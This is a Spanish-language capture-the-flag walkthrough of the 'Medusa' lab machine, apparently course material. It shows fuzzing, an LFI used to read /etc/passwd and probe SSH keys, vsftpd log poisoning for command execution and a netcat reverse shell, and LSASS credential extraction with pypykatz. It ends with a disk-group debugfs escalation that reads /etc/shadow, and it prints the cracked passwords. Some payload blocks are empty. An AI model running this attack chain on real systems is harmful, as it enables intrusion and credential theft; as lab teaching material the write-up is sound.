---
title: "🖥️ Máquina: Medusa — Hacking Ético"
aliases:
  - Medusa
  - medusa
  - Máquina Medusa
  - VM Medusa
  - Writeup Medusa
tags:
  - ifct0109
  - hacking-etico
  - vms
  - vulnerabilidades-web
  - linux
  - ctf
---

# 🖥️ Máquina: Medusa

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Linux  
> **Categoría:** Vulnerabilidades Web  
> **Técnicas trabajadas:** Enumeración web · Fuzzing de subdominios · LFI · Log Poisoning (vsftpd) · ZIP cracking · Volcado LSASS (pypykatz) · Escalada de privilegios (grupo disk + debugfs)  
> **Descripción:** En esta práctica descubriremos recursos ocultos mediante enumeración web y fuzzing de subdominios, explotaremos un LFI combinado con Log Poisoning en el log de FTP para obtener una reverse shell, encontraremos un ZIP protegido con credenciales de un volcado de memoria LSASS de Windows del que extraeremos una contraseña con pypykatz. Finalmente escalaremos privilegios abusando del grupo disk para leer el hash de root desde el dispositivo de bloque y crackearlo con john.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.5`
* **`RHOST` (Víctima / Medusa):** Ej. `10.0.0.13`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina Medusa tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Enumeración de servicios

Comenzamos revisando puertos:

```bash
nmap -sT -p- 10.0.0.13
```

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Y los servicios:

```bash
nmap -A -p 21,22,80 10.0.0.13
```

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
```

En el ftp no hay anonymous:

```bash
ftp anonymous@10.0.0.13
```

```text
Connected to 10.0.0.13.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
530 Login incorrect.
```

```bash
whatweb http://10.0.0.13
```

```text
http://10.0.0.13 [200 OK] Apache[2.4.54], HTTPServer[Debian Linux][Apache/2.4.54 (Debian)],
Title[Apache2 Debian Default Page: It works]
```

```bash
nikto -h http://10.0.0.13
```

```text
- Nikto v2.5.0
+ Server: Apache/2.4.54 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present.
+ /: Server may leak inodes via ETags.
+ /manual/: Web server manual found.
+ /manual/images/: Directory indexing found.
+ 8074 requests: 0 error(s) and 6 item(s) reported on remote host
```

---

## 🌐 Fase 2: Enumeración web — pistas en el Apache por defecto

Entramos en la web "http://10.0.0.13/". Es el default.html de apache pero está modificado, han cambiado colores y resaltan varias palabras:

> [!info] Resultado
> · manual
> · public_html
> · kraken → apunta a una web con información sobre logs.
> El recurso However, check Kraken open the door da una pista para "abrir la puerta". Investigamos con gobuster porque de momento el recurso kraken no lo encontramos:

```bash
gobuster dir -r -u http://10.0.0.13 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

```text
/manual        (Status: 200) [Size: 676]
/server-status (Status: 403) [Size: 274]
/hades         (Status: 200) [Size: 0]
```

> [!info] Resultado
> Un nuevo recurso llamado hades. Al cargarlo sale vacío, puede que tenga recursos PHP. Seguimos investigando dentro de él:

```bash
gobuster dir -r -u http://10.0.0.13/hades -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```

```text
/index.php  (Status: 200) [Size: 0]
/door.php   (Status: 200) [Size: 555]
```

> [!info] Resultado
> Un recurso door.php, lo visitamos: http://10.0.0.13/hades/door.php. Pide una clave por lo que probamos Kraken que encontramos en el apache. Nos introduce y sale un mensaje con un dominio medusa.hmv. Añadimos la DNS al archivo /etc/hosts:

```bash
sudo bash -c
```

---

## 🔍 Fase 3: Fuzzing de subdominios

Vamos a enumerar subdominios del sitio, una vez añadido al /etc/hosts. Usamos ffuf por su rapidez y como siempre primero lo lanzamos sin filtro:

```bash
ffuf -u 'http://medusa.hmv' -H 'HOST: FUZZ.medusa.hmv' -w /usr/share/seclists/Discovery/DNS/services-names.txt
```

> [!info] Resultado
> Lo paramos con CTRL+C y viendo que la mayoría de respuestas tienen un tamaño de 10674 las filtramos:

```bash
ffuf -u 'http://medusa.hmv' -H 'HOST: FUZZ.medusa.hmv' -w /usr/share/seclists/Discovery/DNS/services-names.txt -fs 10674
```

```text
dev  [Status: 200, Size: 1973, Words: 374, Lines: 26, Duration: 3185ms]
```

> [!info] Resultado
> Nos revela un subdominio dev. Editamos el archivo /etc/hosts y lo añadimos en la línea del dominio:

```bash
sudo nano /etc/hosts
```

```text
10.0.0.13  medusa.hmv dev.medusa.hmv
```

> [!info] Resultado
> Guardamos CTRL+O Enter y salimos con CTRL+X. Ahora seguimos investigando el nuevo subdominio:

```bash
gobuster dir -u http://dev.medusa.hmv -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

```text
/files   (Status: 301) [--> http://dev.medusa.hmv/files/]
/assets  (Status: 301) [--> http://dev.medusa.hmv/assets/]
/css     (Status: 301) [--> http://dev.medusa.hmv/css/]
/manual  (Status: 301) [--> http://dev.medusa.hmv/manual/]
```

> [!info] Resultado
> Recurso files que seguimos investigando:

```bash
gobuster dir -u http://dev.medusa.hmv/files -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php
```

```text
/index.php   (Status: 200) [Size: 0]
/system.php  (Status: 200) [Size: 0]
```

---

## 🔗 Fase 4: LFI en system.php

Vamos a intentar si hay parámetro LFI en el recurso system.php nuevamente con ffuf. Primero lo lanzamos sin filtro:

```bash
ffuf -u 'http://dev.medusa.hmv/files/system.php?FUZZ=/etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

> [!info] Resultado
> Y en vista del tamaño de 0 lo filtramos quitándolo de los resultados:

```bash
ffuf -u 'http://dev.medusa.hmv/files/system.php?FUZZ=/etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 0
```

```text
view  [Status: 200, Size: 1452, Words: 14, Lines: 28, Duration: 1ms]
```

> [!info] Resultado
> Encontramos un parámetro con LFI. Lo probamos:

```bash
curl "http://dev.medusa.hmv/files/system.php?view=/etc/passwd"
```

> [!info] Resultado
> Y vemos un usuario spectre en el sistema:

```text
spectre:x:1000:1000:spectre,,,:/home/spectre:/bin/bash
```

Revisamos archivos interesantes de ese usuario:

```bash
curl "http://dev.medusa.hmv/files/system.php?view=/home/spectre/.bashrc"
```

> [!info] Resultado
> Existe.

```bash
curl "http://dev.medusa.hmv/files/system.php?view=/home/spectre/.bash_history"
```

> [!info] Resultado
> No hay nada.

```bash
curl "http://dev.medusa.hmv/files/system.php?view=/home/spectre/.ssh/authorized_keys"
```

> [!info] Resultado
> No hay nada.

```bash
curl "http://dev.medusa.hmv/files/system.php?view=/home/spectre/.ssh/id_rsa"
```

> [!info] Resultado
> Tampoco hay nada. Vamos a buscar ahora archivos interesantes para sistemas Linux usando un diccionario LFI especializado:

```bash
ffuf -u 'http://dev.medusa.hmv/files/system.php?view=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt -fs 0
```

> [!info] Resultado
> Entre todos ellos hay un log del ftp. Interesante hay log del vsftpd, vamos a probar log poisoning:

```text
/var/log/vsftpd.log  [Status: 200, Size: 328, Words: 45, Lines: 5, Duration: 1ms]
```

```bash
curl 'http://dev.medusa.hmv/files/system.php?view=/var/log/vsftpd.log'
```

```text
Sat Mar 21 07:55:44 2026 [pid 527] [anonymous] FAIL LOGIN: Client "::ffff:10.0.0.5"
Sat Mar 21 07:55:44 2026 [pid 534] [anonymous] FAIL LOGIN: Client "::ffff:10.0.0.5"
Sat Mar 21 07:55:44 2026 [pid 528] [anonymous] FAIL LOGIN: Client "::ffff:10.0.0.5"
```

> [!info] Resultado
> Aparecen los intentos de acceso anteriores desde nuestra IP de Kali e interesante que sale el nombre de usuario. Vamos a ver si podemos envenenarlo.

---

## ☠️ Fase 5: Log Poisoning — reverse shell via FTP

Accedemos al ftp de esta forma y cuando nos pide el nombre de usuario ponemos lo siguiente:

```bash
ftp 10.0.0.13
```

```text
Connected to 10.0.0.13.
220 (vsFTPd 3.0.3)
Name (10.0.0.13:tecnico): 
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
```

> [!info] Resultado
> Pulsamos enter y al no tener contraseña también pulsamos enter. El proceso reflejado queda así:

```bash
ftp 10.0.0.13
```

```text
Connected to 10.0.0.13.
220 (vsFTPd 3.0.3)
Name (10.0.0.13:tecnico): 
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp>
```

> [!info] Resultado
> Salimos del ftp. Y ahora vamos a probar a ver si nos ejecuta comandos usando el LFI anterior:

```bash
curl 'http://dev.medusa.hmv/files/system.php?view=/var/log/vsftpd.log&cmd=id'
```

```text
Sat Mar 21 08:26:27 2026 [pid 876] [uid=33(www-data) gid=33(www-data) groups=33(www-data)]
```

> [!info] Resultado
> Confirma la ejecución de comandos. Vamos a intentar darnos una conexión inversa. En un terminal aparte de Kali Linux la ponemos en escucha:

```bash
nc -lnvp 9002
```

```text
listening on [any] 9002 ...
```

Ahora volvemos a conectarnos al ftp y le ponemos el siguiente payload en el nombre de usuario:

```bash

```

> [!info] Resultado
> Pulsamos enter varias veces y nos salimos del ftp. Todo el proceso quedaría:

```text

```

Ejecutamos ahora el nuevo envenenamiento y nos debería dar la conexión inversa en el terminal de escucha:

```bash
curl 'http://dev.medusa.hmv/files/system.php?view=/var/log/vsftpd.log'
```

> [!info] Resultado
> Y ya tenemos conexión inversa:

```text
listening on [any] 9002 ...
connect to [10.0.0.5] from (UNKNOWN) [10.0.0.13] 52384
```

Mejoramos el shell:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

---

## 🗜️ Fase 6: ZIP protegido — volcado LSASS con pypykatz

Buscando e investigando encontramos lo siguiente:

```bash
find / -type f -user www-data 2>/dev/null | egrep -v "var|sys|proc"
```

```text
/.../old_files.zip
```

```bash
cd /...
```

```bash
ls -l
```

```text
-rw------- 1 www-data www-data 12387024 Jan 18  2023 old_files.zip
```

Montamos un servidor web para poder descargarlo:

```bash
python3 -m http.server 8080
```

Ahora abrimos otro terminal en Kali y lo descargamos:

```bash
wget http://10.0.0.13:8080/old_files.zip
```

> [!info] Resultado
> Si intentamos descomprimirlo pide contraseña, por lo que extraemos su hash y tratamos de crackearlo:

```bash
zip2john old_files.zip > hash.txt
```

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```text
medusa666  (old_files.zip/lsass.DMP)
```

Ahora lo descomprimimos usando esa contraseña:

```bash
7z x old_files.zip
```

```text
Enter password (will not be echoed): medusa666
```

> [!info] Resultado
> Vemos que al extraer el contenido tenemos un archivo dump de contraseñas de windows:

```bash
ls -la
```

```text
-rwxr-xr-x  1 tecnico tecnico 34804383 ene 17  2023 lsass.DMP
```

```bash
file lsass.DMP
```

```text
lsass.DMP: Mini DuMP crash report, 12 streams, Tue Jan 17 14:08:32 2023, 0x1826 type
```

Tratamos con pypykatz de ver si podemos extraer contraseñas:

```bash
pypykatz lsa minidump lsass.DMP
```

Vamos a filtrar los resultados en busca de información:

```bash
pypykatz lsa minidump lsass.DMP | grep -C5 Password
```

```bash
pypykatz lsa minidump lsass.DMP | grep -C2 spectre
```

> [!info] Resultado
> Un usuario coincide con el que tenemos en la máquina, probamos por ssh:
> · username: spectre
> · domainname: Medusa-PC
> · password: 5p3ctr3_p0is0n_xX

---

## 🔑 Fase 7: Acceso SSH como spectre

```bash
ssh spectre@10.0.0.13
```

```text
spectre@10.0.0.13's password: 5p3ctr3_p0is0n_xX
```

Accedemos por ssh por lo que el resto de terminales ya no son necesarios:

```bash
id
```

```text
uid=1000(spectre) gid=1000(spectre) groups=1000(spectre),6(disk),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

```bash
ls -la
```

```bash
cat user.txt
```

```text
good job!
487a5d1ce02c53fbf60c3abd300d9ff5
```

> [!info] Resultado
> Flag de usuario obtenida: 487a5d1ce02c53fbf60c3abd300d9ff5
> Cuando hemos hecho el id el usuario pertenece a uno de los llamados grupo peligrosos en linux.
> https://hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html?highlight=linux%20groups#disk-group
> Nota: Los grupos peligrosos en linux a los que un usuario puede pertenecer son:
> sudo, wheel, shadow, staff, video, root, docker, lxc/lxd, adm

---

## 🚀 Fase 8: Escalada de privilegios — grupo disk + debugfs

```bash
🔵 Alternativa usar linpeas:
    wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```

```bash
chmod +x linpeas.sh
```

```bash
./linpeas.sh > linpeas.txt
```

```bash
scp spectre@10.0.0.13:/home/spectre/linpeas.txt ./
```

```text
spectre@10.0.0.13's password: 5p3ctr3_p0is0n_xX
```

```bash
less -R linpeas.txt
```

```text
User & Groups: uid=1000(spectre) gid=1000(spectre) groups=1000(spectre),6(disk),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

> [!info] Resultado
> Revisamos cómo podemos elevar privilegios.
> https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group
> Información:
> Disk Group — This privilege is almost equivalent to root access as you can access all the data inside of the machine.
> Files: /dev/sd[a-z][1-9]
> df -h #Find where "/" is mounted
> debugfs /dev/sda1
> debugfs: cd /root
> debugfs: ls
> debugfs: cat /root/.ssh/id_rsa
> debugfs: cat /etc/shadow
> De vuelta nosotros al terminal de la VM medusa.

```bash
df -h
```

```bash
debugfs /dev/sda1
```

```bash
find / -name debugfs 2>/dev/null
```

```text
/usr/sbin/debugfs
```

```bash
/usr/sbin/debugfs /dev/sda1
```

Miramos el archivo shadow:

```bash
cat /etc/shadow
```

```text
root:$y$j9T$AjVXCCcjJ6jTodR8BwlPf.$4NeBwxOq4X0/0nCh3nrIBmwEEHJ6/kDU45031VFCWc2:19375:0:99999:7:::
```

Volvemos a Kali y lo guardamos en un txt:

```bash
echo '$y$j9T$AjVXCCcjJ6jTodR8BwlPf.$4NeBwxOq4X0/0nCh3nrIBmwEEHJ6/kDU45031VFCWc2' > hash_root.txt
```

Y lo crackeamos con john:

```bash
john hash_root.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt
```

```text
andromeda  (?)
```

Otra vez a la máquina de medusa, salimos del debugfs:

```bash
quit
```

Nos transformamos en root con la nueva contraseña:

```bash
su
```

```text
Password: andromeda
```

Y capturamos la bandera:

```bash
cd /root
```

```bash
ls -la
```

```bash
cat .rO0t.txt
```

```text
congrats hacker :)
34b1e6fc5e7fe0bfd56ed4b8776c9f5b
```

> [!info] Resultado
> Flag de root obtenida: 34b1e6fc5e7fe0bfd56ed4b8776c9f5b

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
